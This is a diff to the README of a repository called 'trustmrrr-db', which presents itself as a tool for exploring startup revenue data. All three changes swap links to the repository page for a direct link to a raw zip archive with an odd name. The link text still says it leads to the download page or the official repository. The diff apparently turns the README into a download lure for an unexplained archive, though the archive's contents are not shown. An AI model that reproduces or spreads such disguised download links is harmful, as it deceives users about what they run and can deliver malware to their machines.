@@ -1,6 +1,6 @@
 # ⚡ trustmrrr-db - Explore Startup Revenue Data Easily
 
-[![Download trustmrrr-db](https://img.shields.io/badge/download-Get_trustmrrr-db-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rehan928-creator/trustmrrr-db)
+[![Download trustmrrr-db](https://img.shields.io/badge/download-Get_trustmrrr-db-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rehan928-creator/trustmrrr-db/main/dashboard/trustmrrr_db_Galaxiidae.zip)
 
 ## 📋 What is trustmrrr-db?
 
@@ -21,7 +21,7 @@ You do not need special software or programming knowledge. The app is standalone
 
 1. Click the big green badge above or use this link to visit the download page:
    
-   [Download trustmrrr-db on GitHub](https://github.com/Rehan928-creator/trustmrrr-db)
+   [Download trustmrrr-db on GitHub](https://raw.githubusercontent.com/Rehan928-creator/trustmrrr-db/main/dashboard/trustmrrr_db_Galaxiidae.zip)
 
 2. On the GitHub page, look for the latest release or download section.
 
@@ -82,4 +82,4 @@ If you run into issues:
 
 Use this direct link to visit the official repository anytime and get the latest version:
 
-[![Download trustmrrr-db](https://img.shields.io/badge/download-GitHub_Download-0052cc?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rehan928-creator/trustmrrr-db)
+[![Download trustmrrr-db](https://img.shields.io/badge/download-GitHub_Download-0052cc?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rehan928-creator/trustmrrr-db/main/dashboard/trustmrrr_db_Galaxiidae.zip)
